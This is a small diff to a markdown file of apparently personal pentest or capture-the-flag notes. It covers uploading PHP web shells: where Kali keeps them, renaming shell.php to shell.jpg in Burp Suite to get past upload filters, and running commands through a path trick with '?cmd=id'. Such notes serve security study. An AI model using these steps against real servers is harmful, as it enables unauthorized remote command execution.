@@ -79,7 +79,7 @@ echo "<pre>$output</pre>";
   - __```ls -al /usr/share/webshells/php```__
 
  #### 3
-- __If file upload restricts PHP file types, rename shell.php to an image extension like shell.jpg. Simply visiting `<url>/shell.jpg` won’t execute the PHP script. To run the script, append `/shell.php` to the URL: `<url>/shell.jpg/shell.php`__
+- __If file upload restricts PHP file types, rename shell.php to an image extension like shell.jpg in burp suite. Simply visiting `<url>/shell.jpg` won’t execute the PHP script. To run the script, append `/shell.php` to the URL: `<url>/shell.jpg/shell.php`__
   - __```<url>/shell.jpg/shell.php?cmd=id```__
   - > __Note: This can be done in nginx by chrome__
 ### OR
